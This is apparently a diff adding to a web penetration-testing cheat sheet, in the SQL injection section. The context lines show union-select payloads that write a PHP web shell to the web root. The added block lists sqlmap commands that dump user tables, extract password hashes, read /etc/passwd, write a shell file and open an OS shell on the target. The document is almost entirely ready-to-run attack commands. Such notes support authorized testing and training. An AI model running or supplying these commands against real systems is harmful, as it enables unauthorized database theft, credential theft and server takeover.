@@ -648,6 +648,42 @@ cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/
 cn' union select "",'<?php system($_REQUEST[cmd]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
 ```
 
+- SQLMap
+
+```
+$ sqlmap -u <URL> --batch
+$ sqlmap <URL> --data 'uid=1&name=test'
+$ sqlmap <URL> --data 'uid=1*&name=test'
+$ sqlmap <URL> --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
+$ sqlmap -u <URL> --data='id=1' --method PUT
+$ sqlmap -u <URL> --batch -t /tmp/traffic.txt
+$ sqlmap -u <URL> -v 6 --batch
+$ sqlmap -u <URL> --prefix="%'))" --suffix="-- -"
+$ sqlmap -u <URL> -v 3 --level=5
+$ sqlmap -u <URL> --banner --current-user --current-db --is-dba
+$ sqlmap -u <URL> --tables -D testdb
+$ sqlmap -u <URL> --dump -T users -D testdb -C name,surname
+$ sqlmap -u <URL> --dump -T users -D testdb --where="name LIKE 'f%'"
+$ sqlmap -u <URL> --schema
+$ sqlmap -u <URL>--search -T user
+$ sqlmap -u <URL> --passwords --batch
+$ sqlmap -u <URL> --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
+$ sqlmap --list-tampers
+$ sqlmap -u <URL> --is-dba
+$ sqlmap -u <URL> --file-read "/etc/passwd"
+$ sqlmap -u <URL> --file-write "shell.php" --file-dest "/var/www/html/shell.php"
+$ sqlmap -u <URL> --os-shell
+```
+
+- SQLMAP .req file
+
+```
+Copy the entire request from Burp
+$ vi login.req
+Paste the entire request from Burp
+$ sqlmap -r login.req
+```
+
 #11. - Sensitive Data Exposure
 -----------------------------------------
 
